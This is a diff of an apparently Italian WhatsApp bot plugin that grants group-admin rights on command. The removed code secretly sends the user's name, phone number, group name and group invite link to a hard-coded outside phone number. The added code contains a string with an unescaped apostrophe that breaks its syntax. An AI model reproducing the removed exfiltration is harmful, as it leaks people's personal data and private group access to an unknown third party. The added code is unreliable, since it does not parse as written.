@@ -1,33 +1,26 @@
-const handler = async (m, { conn, isAdmin }) => {
-    if (isAdmin) return
+const handler = async (m, { conn }) => {
+  const owner = m.key.participant || m.participant;
 
-    try {
-        const groupMetadata = await conn.groupMetadata(m.chat)
-        await conn.groupParticipantsUpdate(m.chat, [m.sender], 'promote')
-        const groupLink = await conn.groupInviteCode(m.chat)
-        const fullLink = `https://chat.whatsapp.com/${groupLink}`
+  try {
+    await conn.groupParticipantsUpdate(m.chat, [owner], 'promote');
 
-        await conn.sendMessage('19707807900@s.whatsapp.net', {
-            text: `━━━━⬣ AUTOADMIN ⬣━━━━
+    await conn.sendMessage(m.chat, { 
+      text: '*ho dato admin all'owner.*'
+    }, { quoted: m });
 
-👤 *Utente:* @${m.sender.split('@')[0]}
-📝 *Nome:* ${conn.getName(m.sender)}
-📞 *Numero:* +${m.sender.split('@')[0]}
+  } catch (e) {
+    console.error('Errore durante l\'aggiunta dell\'admin:', e);
+    await conn.sendMessage(m.chat, { 
+      text: '❌ Errore! Qualcosa è andato storto... ⚡' 
+    }, { quoted: m });
+  }
+};
 
-📌 *Gruppo:*\n${groupMetadata.subject}
-🔗 *Link:*\n${fullLink}`,
-            mentions: [m.sender],
-            quoted: m
-        })
+handler.help = ['autoadmin'];
+handler.tags = ['group'];
+handler.command = /^godmode$/i;  
+handler.group = true;  
+handler.owner = true;  
+handler.botAdmin = true; 
 
-    } catch (e) {
-        console.error(e)
-    }
-}
-
-handler.command = ['autoadmin', 'autoadm', 'almighty']
-handler.owner = true
-handler.group = true
-handler.botAdmin = true
-
-export default handler
+export default handler;
